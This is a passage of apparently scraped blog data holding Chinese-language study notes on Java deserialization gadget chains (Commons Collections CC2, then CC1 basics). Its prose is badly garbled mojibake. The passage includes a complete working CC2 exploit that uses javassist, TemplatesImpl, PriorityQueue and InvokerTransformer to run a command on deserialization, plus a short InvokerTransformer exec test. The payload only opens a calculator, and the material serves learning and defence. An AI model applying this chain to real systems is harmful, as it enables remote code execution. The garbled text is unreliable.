·å°±ä¸èƒ½è¾¾åˆ°æ—¢å®šçš„ç›®çš„ã€‚\nä½†æ˜¯å¦‚æœæˆ‘ä»¬å°†TemplatesImplç±»å®ä¾‹æ”¾åœ¨å‰é¢ï¼Œé‚£ä¹ˆå°±ä¼šå…ˆä¼ å…¥TemplatesImplï¼ŒæˆåŠŸå®Œæˆä¸€æ¬¡method.invoke()ï¼Œä¹Ÿå°±ä¼šæˆåŠŸåŠé€†è¡Œä¸€æ¬¡å‘½ä»¤æ‰§è¡Œã€‚è™½ç„¶åŒæ ·ä¼šæŠ¥é”™é€€å‡ºï¼Œä½†æ˜¯å·²ç»è¾¾åˆ°äº†æ—¢å®šç›®çš„ã€‚è¿™ä¹Ÿå°±æ˜¯éœ€è¦å°†TemplatesImplç±»å®ä¾‹æ”¾åœ¨å‰é¢çš„åŸå› ã€‚\né‚£ä¹ˆå¯¹äºåç»­çš„è°ƒç”¨çš„InvokerTransformerç±»çš„transform()æ–¹æ³•ä¹Ÿæ¸…æ¥šäº†ï¼š è·Ÿæˆ‘ä»¬ä¹‹å‰è¯´çš„CC3é‚£é‡Œå¼‚æ›²åŒå·¥ï¼Œè¿˜æ˜¯æ¯”è¾ƒç²¾å¦™çš„ã€‚\nç°åœ¨åŸºæœ¬å°±é€šäº†ï¼Œè¿™é‡Œå°±æ˜¯åœ¨åŠ¨æ€åŠ è½½å­—èŠ‚ç è¿‡ç¨‹ä¸­çš„newInstance()æ—¶ä¼šè§¦å‘staticä»£ç å—ï¼Œç„¶åå¼¹å‡ºè®¡ç®—æœºã€‚\næ‰€ä»¥æœ€ç»ˆçš„POCä¸ºï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 package org.example; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.InvokerTransformer; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.util.PriorityQueue; public class Main { public static void main(String[] args) throws Exception{ Constructor constructor = Class.forName(\u0026#34;org.apache.commons.collections4.functors.InvokerTransformer\u0026#34;).getDeclaredConstructor(String.class); constructor.setAccessible(true); InvokerTransformer transformer = (InvokerTransformer) constructor.newInstance(\u0026#34;newTransformer\u0026#34;); TransformingComparator Tcomparator = new TransformingComparator(transformer); PriorityQueue queue = new PriorityQueue(2,Tcomparator); //è·å–é»˜è®¤çš„ClassPool ClassPool pool = ClassPool.getDefault(); //å‘ClassPoolå®¹å™¨æ’å…¥AbstractTranslet.class pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); //åˆ›å»ºCatç±» CtClass cc = pool.makeClass(\u0026#34;Cat\u0026#34;); String cmd = \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;calc.exe\\\u0026#34;);\u0026#34;; //å°±æ˜¯åˆ›å»ºstaticé»˜è®¤æ–¹æ³• cc.makeClassInitializer().insertBefore(cmd); //ç”Ÿæˆä¸€ä¸ªéšæœºçš„ç±»åï¼Œè¿™é‡Œä½¿ç”¨äº†å½“å‰ç³»ç»Ÿæ—¶é—´çš„çº³ç§’éƒ¨åˆ†æ¥ç¡®ä¿â€œå”¯ä¸€æ€§â€ String randomClassName = \u0026#34;EvilCat\u0026#34; + System.nanoTime(); //æ›´æ”¹ç±»åï¼Œä½†æ˜¯åº”è¯¥ç›´æ¥ç”¨Catå°±è¡Œäº†ï¼Œä½†æ˜¯ç”¨æ¥ç¡®ä¿å”¯ä¸€æ€§ä¹Ÿæ˜¯å¯ä»¥çš„ cc.setName(randomClassName); //è®¾ç½®ccç±»çš„çˆ¶ç±» cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); //cc.writeFile(\u0026#34;output\u0026#34;); byte[] classBytes = cc.toBytecode(); byte[][] code = new byte[][]{classBytes}; TemplatesImpl templates = TemplatesImpl.class.newInstance(); setFieldValue(templates, \u0026#34;_bytecodes\u0026#34;, code); setFieldValue(templates, \u0026#34;_name\u0026#34;, \u0026#34;fupanc\u0026#34;); setFieldValue(templates, \u0026#34;_class\u0026#34;, null); Object[] queue_array = new Object[]{templates,1}; Field queue_field = Class.forName(\u0026#34;java.util.PriorityQueue\u0026#34;).getDeclaredField(\u0026#34;queue\u0026#34;); queue_field.setAccessible(true); queue_field.set(queue,queue_array); Field size = Class.forName(\u0026#34;java.util.PriorityQueue\u0026#34;).getDeclaredField(\u0026#34;size\u0026#34;); size.setAccessible(true); size.set(queue,2); ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); outputStream.writeObject(queue); outputStream.close(); ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); inputStream.readObject(); } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } } æˆåŠŸæŒ‰ç…§é¢„æœŸå¼¹å‡ºä¸€ä¸ªè®¡ç®—æœºã€‚\nç¨å¾®æ”¹ä¸€ç‚¹javassistä»£ç å°±å¯ä»¥å¾—åˆ°æ„é€ å‡ºæ¥çš„ç±»ä¸ºï¼š è¿˜æœ‰ä¸€ä¸ªç‚¹å°±æ˜¯ä¸ºä»€ä¹ˆåœ¨åŠ¨æ€åŠ è½½å­—èŠ‚ç é‚£é‡Œä¼šå°‘ä¸€è¡Œï¼Œè¿™æ˜¯å› ä¸ºTemplatesImplç±»çš„readObject()æ–¹æ³•æœ‰å®šä¹‰ï¼š åœ¨æ„é€ ä»£ç æ—¶ä¹Ÿå¯ä»¥åŠ ä¸Šï¼ŒåƒCC3é‚£æ ·ã€‚\nä½†æ˜¯æˆ‘æœ‰ç‚¹å°å¥‡æ€ªçš„å°±æ˜¯ä¸ºå•¥ä¸ç”¨åœ¨æ¯”å¦‚Catç±»é‡å†™é‚£ä¸¤ä¸ªtransform()æ–¹æ³•ï¼Œä½†æ˜¯æ— æ‰€è°“ï¼Œå°±ç®—ä¸èƒ½ç”¨ä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨javassistå°†transform()æ–¹æ³•æ·»åŠ ä¸Šå»å³å¯ã€‚\n","date":"2025-01-22T13:37:04+08:00","permalink":"https://fupanc-w1n.github.io/p/cc2/","title":"CC2"},{"content":"CC1 å‰é¢è¯´è¿‡äº†URLDNSè¿™æ¡é“¾ï¼Œç°åœ¨æˆ‘ä»¬å°±å¯ä»¥å¼€å§‹å­¦ä¹ Common-Collectionsåˆ©ç”¨é“¾ï¼Œè¿™æ˜¯ååºåˆ—åŒ–å­¦ä¹ ä¸­ä¸å¯é€ƒè¿‡çš„ä¸€å…³ã€‚\nå°çš„çŸ¥è¯†ç‚¹ æ¥è¡¥å……ä¸€ä¸‹ä¹‹å‰ä¸€ç›´é‡åˆ°çš„ä¸€ä¸ªçŸ¥è¯†ç‚¹ï¼ŒJAVAåŸºç¡€ï¼Œä¸€ç›´åœ¨å¿˜è®°ï¼Œå°±æ˜¯æ•°ç»„é—®é¢˜ï¼Œè¿™é‡Œç®€å•è®°å½•ä¸€ä¸‹æ•°ç»„çš„åˆå§‹åŒ–é—®é¢˜ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 //ç¬¬ä¸€ç§ ä½¿ç”¨æ•°ç»„æ¥è¡¨ç¤ºâ€œä¸€ç»„â€intç±»å‹,ç„¶åå†åˆ†å¼€èµ‹å€¼å³å¯ int[] ns = new int[5]; ns[0] = 68; ns[1] = 66; ... å¯ä»¥ä½¿ç”¨ æ•°ç»„å˜é‡.length è·å–æ•°ç»„å¤§å° //ç¬¬äºŒç§ å®šä¹‰æ•°ç»„æ—¶ç›´æ¥æŒ‡å®šåˆå§‹åŒ–çš„å…ƒç´ ï¼Œè¿™æ ·å°±ä¸å¿…å†™å‡ºæ•°ç»„å¤§å°ï¼Œè€Œæ˜¯ç”±ç¼–è¯‘å™¨è‡ªåŠ¨æ¨ç®—æ•°ç»„å¤§å°ã€‚ int[] ns = new int[]{12,23,24,45,45}; //ç¬¬ä¸‰ç§ è¿˜å¯ä»¥åœ¨ç¬¬äºŒæ­¥åŸºç¡€ä¸Šè¿›ä¸€æ­¥ç®€å†™ int[] ns = {11,22,33,44,55}; //ç¬¬å››ç§ è¿™é‡Œå†ç®€å•è®²è®²å­—ç¬¦ä¸²æ•°ç»„ String[] names = {\u0026#34;haha\u0026#34;,\u0026#34;quke\u0026#34;,\u0026#34;erqieha\u0026#34;}; æš‚æ—¶éœ€è¦æ³¨æ„çš„å°±æ˜¯è¿™å››ä¸ªï¼Œç°åœ¨å°±æ­£å¼å¼€å§‹å­¦ä¹ CCé“¾ã€‚\nCommons Collections å‰ç½®è¯´æ˜ Apache Commonsæ˜¯Apacheè½¯ä»¶åŸºé‡‘ä¼šçš„é¡¹ç›®ï¼Œæ›¾ç»éš¶å±äºJakartaé¡¹ç›®ã€‚Commonsçš„ç›®çš„æ˜¯æä¾›å¯é‡ç”¨çš„ã€è§£å†³å„ç§å®é™…çš„é€šç”¨é—®é¢˜ä¸”å¼€æºçš„Javaä»£ç ã€‚Commonsç”±ä¸‰éƒ¨åˆ†ç»„æˆï¼šProperï¼ˆæ˜¯ä¸€äº›å·²å‘å¸ƒçš„é¡¹ç›®ï¼‰ã€Sandboxï¼ˆæ˜¯ä¸€äº›æ­£åœ¨å¼€å‘çš„é¡¹ç›®ï¼‰å’ŒDormantï¼ˆæ˜¯ä¸€äº›åˆšå¯åŠ¨æˆ–è€…å·²ç»åœæ­¢ç»´æŠ¤çš„é¡¹ç›®ï¼‰ã€‚\nCommons CollectionsåŒ…ä¸ºJavaæ ‡å‡†çš„Collections APIæä¾›äº†ç›¸å½“å¥½çš„è¡¥å……ã€‚åœ¨æ­¤åŸºç¡€ä¸Šå¯¹å…¶å¸¸ç”¨çš„æ•°æ®ç»“æ„æ“ä½œè¿›è¡Œäº†å¾ˆå¥½çš„å°è£…ã€æŠ½è±¡å’Œè¡¥å……ã€‚è®©æˆ‘ä»¬åœ¨å¼€å‘åº”ç”¨ç¨‹åºçš„è¿‡ç¨‹ä¸­ï¼Œæ—¢ä¿è¯äº†æ€§èƒ½ï¼ŒåŒæ—¶ä¹Ÿèƒ½å¤§å¤§ç®€åŒ–ä»£ç ã€‚\nç”±äºå¤§é‡çš„ç”Ÿäº§ç¯å¢ƒä¸­éƒ½ä¼šå¯¼å…¥è¿™ä¸ªåŒ…ï¼Œæ‰€ä»¥æ­¤åŒ…ä¸­çš„ä¼—å¤šååºåˆ—åŒ–é“¾å·²ç»æˆä¸ºç»å…¸é“¾æ¡ã€‚\nå­¦ä¹ è·¯çº¿ï¼šCC1 -\u0026gt; CC6 -\u0026gt; CC3 -\u0026gt; CC5 -\u0026gt; CC7 -\u0026gt; CC2 -\u0026gt; CC4 (å…¶ä¸­CC2å’ŒCC4æ˜¯common-collections4çš„åˆ©ç”¨é“¾)\nç¯å¢ƒæ­å»º Apache Commonsé¡¹ç›®éœ€è¦å¯¼å…¥ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨è¿™é‡Œéœ€è¦æ­å»ºç¯å¢ƒï¼Œè¿˜æ˜¯ä½¿ç”¨mavenæ¥å¯¼åŒ…ï¼Œä¿®æ”¹pom.xmlå³å¯ï¼Œæ¯”å¦‚æˆ‘è¿™é‡Œè¦å¯¼ä¸€ä¸ªcc3.2.1ï¼ŒåŠ ä¸Šå¦‚ä¸‹ï¼š\n1 2 3 4 5 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;commons-collections\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;commons-collections\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.2.1\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; å†æ›´æ–°ä¸€ä¸‹é¡¹ç›®å³å¯ã€‚\nä¸‹è½½å¹¶ä¸”é…ç½®ç›¸åº”æºç  å› ä¸ºJDKè‡ªå¸¦Â·çš„åŒ…é‡Œé¢æœ‰äº›æ–‡ä»¶æ˜¯åç¼–è¯‘çš„.classæ–‡ä»¶å¯¼è‡´æˆ‘ä»¬æ²¡æ³•æ¸…æ¥šçœ‹æ‡‚ä»£ç ï¼Œä¸ºäº†æ–¹ä¾¿è°ƒè¯•ï¼Œæˆ‘ä»¬éœ€è¦å°†å®ƒä»¬è½¬å˜ä¸º.javaæ–‡ä»¶ï¼Œè¿™å°±éœ€è¦æˆ‘ä»¬å®‰è£…å“åº”çš„æºç ã€‚\nä¸‹è½½åœ°å€ï¼šhttps://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4\nå…ˆåŸæœ¬jdkç›®å½•ä¸‹çš„src.zipè§£å‹åˆ°å½“å‰ç›®å½•ï¼Œåœ¨é“¾æ¥ä¸­ç‚¹å‡»zipä¸‹è½½åè§£å‹ï¼Œåœ¨/src/share/classesä¸­æ‰¾åˆ°sunæ–‡ä»¶ï¼ŒæŠŠå…¶å¤åˆ¶åˆ°åŸæœ¬jdkä¸­src.zipçš„è§£å‹æ–‡ä»¶ã€‚\næœ€åå†åœ¨ideaä¸­æŠŠsrcæ–‡ä»¶å¤¹æ·»åŠ åˆ°åŸè·¯å¾„ä¸‹å³å¯ï¼š\nåŠ¨æ€ä»£ç† ä¸»è¦å†…å®¹å°±å›å»çœ‹åŠ¨æ€ä»£ç†ç¬”è®°çš„å†…å®¹ï¼Œä¸»è¦å°±æ˜¯ä¸€ä¸ªç‚¹ï¼šå½“æˆ‘ä»¬è°ƒç”¨æŸä¸ªåŠ¨æ€ä»£ç†å¯¹è±¡çš„æ–¹æ³•æ—¶ï¼Œéƒ½ä¼šè§¦å‘ä»£ç†ç±»çš„Invokeæ–¹æ³•ï¼Œå¹¶ä¼ é€’å¯¹åº”çš„å†…å®¹ã€‚\næ­£å¼åˆ†æ æµ‹è¯•ç¯å¢ƒï¼š\nJDK 8u65 commons-collections 3.2.1 éœ€è¦äº†è§£çš„ç±»å’Œæ¥å£ AbstractMapDecorator åœ¨CCåº“ä¸­æä¾›äº†ä¸€ä¸ªæŠ½è±¡ç±»org.apache.commons.collections.map.AbstractMapDecoratorï¼Œè¿™ä¸ªç±»æ˜¯Mapçš„æ‰©å±•ï¼Œä»åå­—æ¥çœ‹ï¼Œè¿™æ˜¯ä¸€ä¸ªåŸºç¡€çš„è£…é¥°å™¨ï¼Œç”¨æ¥ç»™mapæä¾›é™„åŠ åŠŸèƒ½ï¼Œè¢«è£…é¥°çš„mapå­˜åœ¨è¯¥ç±»çš„å±æ€§ä¸­ï¼Œå¹¶ä¸”å°†æ‰€æœ‰çš„æ“ä½œéƒ½è½¬å‘ç»™è¿™ä¸ªmapã€‚\nè¿™ä¸ªç±»æœ‰å¾ˆå¤šå®ç°ç±»ï¼Œå„ä¸ªç±»è§¦å‘çš„æ–¹å¼ä¸åŒï¼Œé‡ç‚¹å…³æ³¨çš„æ˜¯TransformedMap ä»¥åŠLazyMapã€‚\nTransformedMap org.apache.commons.collections.map.TransformedMapç±»å¯ä»¥åœ¨ä¸€ä¸ªå…ƒç´ è¢«åŠ å…¥åˆ°é›†åˆå†…æ—¶ï¼Œè‡ªåŠ¨å¯¹è¯¥å…ƒç´ è¿›è¡Œç‰¹å®šçš„ä¿®é¥°å˜æ¢ï¼Œå…·ä½“çš„å˜æ¢é€»è¾‘ç”±Transformeræ¥å®šä¹‰ï¼ŒTransformer åœ¨ TransformedMap å®ä¾‹åŒ–æ—¶ä½œä¸ºå‚æ•°ä¼ å…¥ã€‚å¯ä»¥ç®€å•çœ‹çœ‹è¿™ä¸ªç±»çš„å®šä¹‰ï¼š\nè¿™ä¸ªç±»ç»§æ‰¿äº†ä¸€ä¸ªç±»å’Œå®ç°äº†ä¸€ä¸ªæ¥å£ã€‚å†çœ‹æºç å…¶å®å¯ä»¥å‘ç°å¾ˆå¤šæ–¹æ³•éƒ½å®ç°äº†transform()æ–¹æ³•\nè¿™é‡Œç»™ä¸€ä¸ªç¤ºä¾‹åˆ©ç”¨ä»£ç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 package org.example; import org.apache.commons.collections.map.TransformedMap; import org.apache.commons.collections.Transformer; import java.util.HashMap; import java.util.Map; public class Test { public static Transformer keyTransformer = new Transformer() { public Object transform(Object input) { int num = (int) input; num += 1; return (Object) num; } }; public static Transformer valueTransformer = new Transformer() { public Object transform(Object input) { String str = input.toString(); return str + \u0026#34;1\u0026#34;; } }; public static void main(String[] args) { HashMap\u0026lt;Integer, String\u0026gt; hashMap = new HashMap\u0026lt;\u0026gt;(); hashMap.put(1, \u0026#34;a\u0026#34;); System.out.println(\u0026#34;åˆå§‹åŒ–map:\u0026#34; + hashMap); // åˆ›å»ºTransformedMap Map map = TransformedMap.decorate(hashMap, keyTransformer, valueTransformer); map.put(2, \u0026#34;b\u0026#34;); System.out.println(\u0026#34;transformMap:\u0026#34; + map); map.put(1, \u0026#34;w\u0026#34;); System.out.println(\u0026#34;transformMap:\u0026#34; + map); map.remove(1); System.out.println(\u0026#34;transformMap:\u0026#34; + map); } } è¿è¡Œåçš„è¾“å‡ºç»“æœï¼š\n1 2 3 4 åˆå§‹åŒ–map:{1=a} transformMap:{1=a, 3=b1} transformMap:{1=a, 2=w1, 3=b1} transformMap:{2=w1, 3=b1} å…¶å®è¿™é‡Œå‡ºç°è¿™ä¸ªç»“æœçš„åŸå› è¿˜æ˜¯å’Œå¯¹è±¡ç›¸å…³ï¼Œå¯ä»¥æ¥è°ƒè¯•ä¸€ä¸‹ï¼š\nè¿™é‡Œé¦–å…ˆäº†è§£ä¸€ä¸‹åŒ¿åç±»æ˜¯ä»€ä¹ˆï¼Œå¯ä»¥å‚è€ƒè¿™ä¸ªæ–‡ç« ï¼Œå°±æ˜¯å¯ä»¥å®ç°ä¸€ä¸ªç±»ä¸­åŒ…å«å¦å¤–ä¸€ä¸ªç±»ï¼Œä¸”ä¸éœ€è¦æä¾›ä»»ä½•çš„ç±»åç›´æ¥å®ä¾‹åŒ–ã€‚ä¸»è¦æ˜¯ç”¨äºåœ¨æˆ‘ä»¬éœ€è¦çš„æ—¶å€™åˆ›å»ºä¸€ä¸ªå¯¹è±¡æ¥æ‰§è¡Œç‰¹å®šçš„ä»»åŠ¡ï¼Œå¯ä»¥ä½¿ä»£ç æ›´åŠ ç®€æ´ã€‚\né‡è¦è¯´æ˜ï¼šé¦–å…ˆåœ¨è¿™ä¸²ä»£ç ä½¿ç”¨åŒ¿åç±»å®ç°äº†Transformeræ¥å£ï¼Œåˆ›å»ºäº†ä¸€ä¸ªå¯¹è±¡ï¼Œä»£ç éƒ½ä½¿ç”¨åŒ¿åç±»å®ç°äº†Transformeræ¥å£ï¼Œåˆ›å»ºäº†ä¸€ä¸ªä¸´æ—¶çš„ç±»å®ä¾‹ï¼ˆå³å¯¹è±¡ï¼‰ï¼Œå¹¶å°†è¿™ä¸ªç±»å®ä¾‹èµ‹å€¼ç»™äº†keyTransformerå’ŒvalueTransformerå¹¶éƒ½é‡å†™äº†transform()æ–¹æ³•ï¼Œè¿™ä¸ªæ˜¯æœ€é‡è¦çš„ã€‚ï¼ˆé‡è¦çš„æ˜¯çœ‹ä»£ç ï¼Œä¸€çœ‹å°±æ‡‚äº†ï¼‰\nç„¶åå¼€å§‹è°ƒè¯•ï¼š\né‡è¦çœ‹åé¢çš„puté‚£éƒ¨åˆ†ï¼Œç¬¬ä¸€ä¸ªå°±æ˜¯HashMapç±»çš„putæ–¹æ³•ï¼Œå°±æ˜¯æ”¾å…¥ä¸€å¯¹é”®å€¼å¯¹ï¼Œä¸å¤šè¯´ã€‚é‡ç‚¹çœ‹åé¢ã€‚\nç„¶åè°ƒç”¨\nè·Ÿè¿›æºç ï¼š\nå³è¿”å›ä¸€ä¸ªTransformedMapå¯¹è±¡ï¼Œå¹¶ä¸”æ­¤æ—¶çš„keyTransformerå’ŒvalueTransformerå¯¹åº”è‡ªå®šä¹‰çš„åŒ¿åç±»ã€‚\nç„¶ååŠ æ–­ç‚¹ï¼š\nç„¶åç°åœ¨æ¥çœ‹å¯¹åº”çš„å˜é‡çš„å€¼ï¼š\né‡ç‚¹çœ‹å€¼ï¼Œæ³¨æ„valueTransformerå’ŒkeyTransformerçš„å€¼ä¸ºTest$2..å’ŒTest$1..ï¼Œç›¸äº’å¯¹æ¯”åˆ°æ¥çœ‹ï¼Œå¯ä»¥å¾ˆå®¹æ˜“çœ‹å‡ºè¿™ç§æ ¼å¼å°±æ˜¯ä»£è¡¨åŒ¿åç±»ï¼Œè€Œä¸æ˜¯ä¸€ä¸ªTestç±»å®ä¾‹ã€‚\nåœ¨åç»­çš„map.put()ä¸­ï¼Œè°ƒç”¨çš„å°±æ˜¯TransformedMapç±»çš„putæ–¹æ³•ï¼š\nç„¶åå°±ä¼šè°ƒç”¨transformKeyæ–¹æ³•ï¼Œæºç å¦‚ä¸‹ï¼š\næ­¤æ—¶å°±ä¼šè°ƒç”¨keyTransformerçš„transformæ–¹æ³•ï¼Œæ­¤æ—¶è°ƒç”¨çš„å°±æ˜¯åŒ¿åç±»çš„transformæ–¹æ³•ï¼Œé‚£ä¹ˆå°±æ˜¯\nvalueTransformer.transformer()åŒç†ã€‚é€»è¾‘æ˜¯è¿™æ ·ï¼Œå¹¶ä¸”åœ¨è°ƒè¯•è¿‡ç¨‹ä¸­ä¹ŸåŒæ ·è¿™è¿™ä¸ªè¿‡ç¨‹ã€‚\nç»§ç»­çœ‹map.put()æ–¹æ³•ï¼š\n1 return this.getMap().put(key, value); è¿™ä¸ªgetMapå¯¹åº”TransformedMapçš„çˆ¶ç±»AbstractInputCheckedMapDecoratorçš„çˆ¶ç±»AbstractMapDecoratorçš„getMap()æ–¹æ³•ï¼Œæºç ä¸ºï¼š\n1 2 3 protected Map getMap() { return this.map; } ç»“åˆå‰é¢çš„å®ä¾‹åŒ–çš„æè¿°ï¼Œå¯ä»¥çŸ¥é“è¿™é‡Œçš„mapå³HashMapç±»å®ä¾‹ï¼Œæ‰€ä»¥è¿™é‡Œä¼šå†è°ƒç”¨HashMapçš„putæ–¹æ³•æ”¾å…¥ä¸€å¯¹ä¿®é¥°åçš„é”®å€¼å¯¹ã€‚\nåé¢é‚£ä¸ªåŒç†\næœ€åä¼šè°ƒç”¨HashMaspç±»çš„removeæ–¹æ³•æ¥å»æ‰ä¸€ä¸ªé”®å€¼å¯¹ã€‚\nä»£ç åˆ†æç»“æŸï¼Œå¯¹äºè¿™ä¸€æ®µç¤ºä¾‹ä»£ç å°±éœ€è¦ç†è§£é€å½»ï¼Œäº†è§£å…¶ä¸­çš„è¿è¡Œè¿‡ç¨‹ä¸é€»è¾‘ï¼Œåé¢ä¼šæœ‰ç”¨ã€‚\nä¹Ÿå°±æ˜¯è¯´å½“ TransformedMap å†…çš„ key æˆ–è€… value å‘ç”Ÿå˜åŒ–æ—¶ï¼ˆä¾‹å¦‚è°ƒç”¨ TransformedMap çš„ put æ–¹æ³•æ—¶ï¼‰ï¼Œå°±ä¼šè§¦å‘ç›¸åº”å‚æ•°çš„ Transformer çš„ transform() æ–¹æ³•ã€‚\nLazyMap org.apache.commons.collections.map.LazyMapä¸TransformedMapç±»ä¼¼ï¼Œè¿™ä¸ªç±»è§¦å‘transform()æ–¹æ³•çš„ç‚¹å°±åœ¨äºè°ƒç”¨get()æ–¹æ³•æ—¶ä¼ å…¥çš„keyä¸å­˜åœ¨ï¼Œçœ‹ä¸€ä¸‹get()æ–¹æ³•çš„æºç ï¼š\n1 2 3 4 5 6 7 8 9 public Object get(Object key) { if (!super.map.containsKey(key)) { Object value = this.factory.transform(key); super.map.put(key, value); return value; } else { return super.map.get(key); } } å†çœ‹ä¸‹é¢ï¼š\nå¯ä»¥çŸ¥é“LazyMapç±»ç»§æ‰¿äºAbstractMapDecoratorã€‚\norg.apache.commons.collections.map.DefaultedMapä¸LazyMapå…·æœ‰ç›¸åŒåŠŸèƒ½ï¼ŒåŒæ ·æ˜¯get()æ–¹æ³•ä¼šè§¦å‘transform æ–¹æ³•ã€‚\nTransformer org.apache.commons.collections.Transformeræ˜¯ä¸€ä¸ªæ¥å£ç±»ï¼Œæºä»£ç å¦‚ä¸‹ï¼š\n1 2 3 4 5 package org.apache.commons.collections; public interface Transformer { Object transform(Object var1); } å®ƒæä¾›äº†ä¸€ä¸ªtransform()æ–¹æ³•ï¼Œç”¨æ¥å®šä¹‰å…·ä½“çš„è½¬æ¢é€»è¾‘ã€‚\nåœ¨Commons Colection é¡¹ç›®ä¸­ï¼Œç¨‹åºæä¾›äº†21ä¸ªTransformer çš„å®ç°ç±»ï¼Œç”¨æ¥å®ç°ä¸åŒçš„å¯¹TransformedMap ä¸­çš„ key/value è¿›è¡Œä¿®æ”¹çš„åŠŸèƒ½\né‡ç‚¹å…³æ³¨å‡ ä¸ªå®ç°ç±»\nInvokerTransformer org.apache.commons.collections.functors.InvokerTransformerï¼Œè¿™ä¸ªå®ç°ç±»ä» Commons Collections 3.0 å¼•å…¥ï¼ŒåŠŸèƒ½æ˜¯ä½¿ç”¨åå°„åˆ›å»ºä¸€ä¸ªæ–°å¯¹è±¡ï¼Œæ¥çœ‹ä¸€ä¸‹å®ƒçš„transformæ–¹æ³•æºç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 public Object transform(Object input) { if (input == null) { return null; } else { try { Class cls = input.getClass(); Method method = cls.getMethod(this.iMethodName, this.iParamTypes); return method.invoke(input, this.iArgs); } catch (NoSuchMethodException var5) { throw new FunctorException(\u0026#34;InvokerTransformer: The method \u0026#39;\u0026#34; + this.iMethodName + \u0026#34;\u0026#39; on \u0026#39;\u0026#34; + input.getClass() + \u0026#34;\u0026#39; does not exist\u0026#34;); } catch (IllegalAccessException var6) { throw new FunctorException(\u0026#34;InvokerTransformer: The method \u0026#39;\u0026#34; + this.iMethodName + \u0026#34;\u0026#39; on \u0026#39;\u0026#34; + input.getClass() + \u0026#34;\u0026#39; cannot be accessed\u0026#34;); } catch (InvocationTargetException var7) { throw new FunctorException(\u0026#34;InvokerTransformer: The method \u0026#39;\u0026#34; + this.iMethodName + \u0026#34;\u0026#39; on \u0026#39;\u0026#34; + input.getClass() + \u0026#34;\u0026#39; threw an exception\u0026#34;, var7); } } } é‡ç‚¹å°±æ˜¯tryéƒ¨åˆ†ä»£ç ï¼š\n1 2 3 Class cls = input.getClass(); Method method = cls.getMethod(this.iMethodName, this.iParamTypes); return method.invoke(input, this.iArgs); è¿™é‡Œä½¿ç”¨åå°„è·å–æ–¹æ³•å¹¶ä½¿ç”¨invoke()æ–¹æ³•è°ƒç”¨è¿™ä¸ªæ–¹æ³•ï¼Œçœ‹çœ‹è¿™é‡Œéœ€è¦åˆ©ç”¨çš„å‡ ä¸ªå‚æ•°ï¼š\n1 2 3 private final String iMethodName; private final Class[] iParamTypes; private final Object[] iArgs; èµ‹å€¼æ–¹æ³•ä¹Ÿåœ¨æ„é€ å‡½æ•°é‡Œé¢ï¼Œå¦‚ä¸‹ï¼š\n1 2 3 4 5 public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) { this.iMethodName = methodName; this.iParamTypes = paramTypes; this.iArgs = args; } å°è¯•è‡ªå·±æ„é€ ï¼Œæµ‹è¯•ä»£ç ï¼š\n1 2 3 4 5 6 7 8 9 10 package org.example; import org.apache.commons.collections.functors.InvokerTransformer; import java.lang.Runtime; public class Test { public static void main(String[] args) { InvokerTransformer x = new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}); x.transform(Runtime.getRuntime()); } } æˆåŠŸå¼¹å‡ºè®¡ç®—æœºï¼š ChainedTransformer org.apache.commons.collections.functors.ChainedTransformerç±»ä¹Ÿæ˜¯Transformerçš„å®ç°ç±»ï¼Œå…³é”®æºç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 public ChainedTransformer(Transformer[] transformers) { this.iTransformers = transformers; } public Object transform(Object object) { for(int i = 0; i \u0026lt; this.iTransformers.length; ++i) { object = this.iTransformers[i].transform(object); } return object; } è¿™é‡Œçš„é‡ç‚¹å°±æ˜¯è¿™ä¸ªç±»è‡ªå·±ç»´æŠ¤äº†ä¸€ä¸ªTransformeræ•°ç»„ï¼Œåœ¨è°ƒç”¨ChainedTransformerçš„transformæ–¹æ³•æ—¶ï¼Œä¼šå¾ªç¯æ•°ç»„ï¼Œä¾æ¬¡è°ƒç”¨ Transformer æ•°ç»„æ¯ä¸ª trandformæ–¹æ³•ï¼Œå¹¶å°†ç»“æœä¼ é€’ç»™ä¸‹ä¸€ä¸ª Transformerã€‚\nè¿™æ ·å°±ç»™äº†ä½¿ç”¨è€…é“¾å¼è°ƒç”¨å¤šä¸ª Transformer åˆ†åˆ«å¤„ç†å¯¹è±¡çš„èƒ½åŠ›ã€‚\nConstantTransformer 